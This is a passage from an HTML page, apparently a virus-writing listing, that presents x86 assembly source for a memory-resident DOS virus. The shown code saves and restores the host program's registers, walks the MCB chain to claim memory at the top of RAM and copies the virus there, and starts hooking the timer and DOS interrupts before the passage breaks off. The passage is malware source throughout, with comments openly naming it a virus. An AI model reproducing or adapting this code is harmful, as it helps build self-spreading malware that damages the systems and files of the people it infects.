repz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Restore first 16 bytes (.COM file)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
movsb</font>
<p><font color="#3333FF">No_rest:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov [Prgseg],ax</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov [Prgofs],bx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ret</font>
<br>&nbsp;
<p><font color="#3333FF">;*** Proc: Save the registers to restore them
after the virus has ended ***</font>
<p><font color="#3333FF">Save_Regs:&nbsp;&nbsp;&nbsp; mov cs:R_ds,ds</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push cs</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop ds</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov R_ax,ax</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov R_bx,bx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov R_cx,cx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov R_dx,dx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov R_di,di</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov R_si,si</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov R_bp,bp</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov R_es,es</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ret</font>
<br>&nbsp;
<p><font color="#3333FF">;*** Restore regs for original program ***</font>
<p><font color="#3333FF">Rst_regs_prg: mov ax,R_ax</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov bx,R_bx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov cx,R_cx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov dx,R_dx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov bp,R_bp</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov di,R_di</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov si,R_si</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov es,R_es</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
test byte ptr [Com_or_exe],1</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jz No_StackRest&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; No stack restore for .COM files</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cli</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov ss,[R_ss]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Restore .EXE stack</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov sp,[R_sp]</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
sti</font>
<p><font color="#3333FF">No_StackRest: mov ds,R_ds</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jmp short jmp_prg</font>
<br>&nbsp;
<p><font color="#3333FF">;*** Restore regs for interrupts ***</font>
<p><font color="#3333FF">Rst_regs_int: mov ax,R_ax</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov bx,R_bx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov cx,R_cx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov dx,R_dx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov bp,R_bp</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov di,R_di</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov si,R_si</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov es,R_es</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov ds,R_ds</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ret</font>
<br>&nbsp;
<p><font color="#3333FF">;*** Proc: Search for last MCB ***</font>
<p><font color="#3333FF">Last_MCB:&nbsp;&nbsp;&nbsp;&nbsp; push ds</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov bx,es</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dec bx</font>
<p><font color="#3333FF">Next_MCB:&nbsp;&nbsp;&nbsp;&nbsp; mov ds,bx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cmp byte ptr [0],5Ah&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Last MCB?</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jz Is_last&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Yes</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
inc bx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
add bx,[3]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Go to next</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cmp bx,0A000h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; In ROM?</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jb Next_MCB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; No, try next one</font>
<p><font color="#3333FF">Is_Last:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop ds</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ret</font>
<br>&nbsp;
<p><font color="#3333FF">;*** Proc: Install virus in end of memory ***</font>
<p><font color="#3333FF">Inst_Mem:&nbsp;&nbsp;&nbsp;&nbsp; call Last_mcb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Search last MCB</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cmp bx,0A000h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; In ROM?</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jb Not_ROM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; No, continue</font>
<p><font color="#3333FF">No_Inst:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push cs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Yes, quit</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop ds</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
stc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Error, virus not installed</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ret</font>
<p><font color="#3333FF">Not_ROM:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov ds,bx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov ax,[3]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; AX = Size last MCB</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
sub ax,cs:[VirPars]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; - (Virussize in pars+1)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jbe no_inst&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Not enough memory, quit</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cmp ax,800h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jb no_inst&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Less than 2048 pars free, quit</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov [3],ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Give program less space to install virus</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
add bx,ax</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
inc bx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; BX = seg where virus comes</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov es:[2],bx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Enter in PSP, program not allowed there</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
sub bx,10h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; - 10h pars (virus starts at 100h)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push bx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push cs</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop ds</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop es</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov si,100h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov di,si</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov cx,[VirSize]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; CX = virussize</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cld</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
repz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Copy virus to virus-segment</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
movsb</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
clc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; No error, virus installed</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ret</font>
<br>&nbsp;
<p><font color="#3333FF">;*** Install new interrupts (1C - Timer Tick,
21 - DOS) ***</font>
<p><font color="#3333FF">Inst_Ints:&nbsp;&nbsp;&nbsp; push es</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop ds</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov word ptr [Ticks],0</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov ax,351Ch&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Get Addr Timer Tick</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int 21h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov I1c_ofs,bx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov I1c_seg,es</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov ax,3521h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Get Addr DOS-Int</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int 21h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov I21_ofs,bx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov I21_seg,es</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov ax,251Ch</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov dx,offset New_I1c</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
